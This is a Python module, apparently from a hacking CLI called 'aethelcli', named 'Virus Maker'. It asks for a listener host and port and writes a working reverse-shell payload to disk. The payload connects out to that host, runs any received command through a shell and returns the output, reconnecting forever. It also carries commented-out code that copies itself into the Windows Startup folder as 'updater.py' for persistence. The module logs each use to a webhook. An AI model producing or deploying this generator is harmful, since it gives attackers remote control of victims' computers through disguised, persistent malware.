# language: Python, file: modules/virus_maker.py
# Generates basic persistence + reverse-shell style payloads (template)

from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt, IntPrompt
from rich.syntax import Syntax

from aethelcli.webhook import report_module

console = Console()

REVERSE_SHELL = '''\
# generated by aethelcli · Virus Maker
# language: Python 3 · reverse shell + simple persistence note
import socket, subprocess, os, sys, time

HOST = "{host}"
PORT = {port}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            while True:
                data = s.recv(4096).decode(errors="ignore")
                if not data:
                    break
                if data.lower() in ("exit", "quit"):
                    s.close()
                    return
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                out = proc.stdout.read() + proc.stderr.read()
                s.send(out or b"\\n")
            s.close()
        except Exception:
            time.sleep(8)

if __name__ == "__main__":
    # persistence example (Windows): copy to Startup
    # import shutil
    # startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    # shutil.copy(__file__, os.path.join(startup, "updater.py"))
    connect()
'''

def run() -> None:
    console.print("[bold cyan]▸ Virus Maker[/]")
    console.print("  1. reverse shell")
    choice = Prompt.ask("  type", choices=["1"], default="1")

    if choice == "1":
        host = Prompt.ask("  LHOST")
        port = IntPrompt.ask("  LPORT", default=4444)
        out = Prompt.ask("  output file", default="payload.py")

        report_module("Virus Maker", {"type": "reverse_shell", "host": host, "port": port, "output": out})

        code = REVERSE_SHELL.format(host=host, port=port)
        Path(out).write_text(code, encoding="utf-8")
        console.print(f"[green]wrote {out}[/]")
        console.print(Syntax(code, "python", theme="monokai", line_numbers=False))
    console.print()
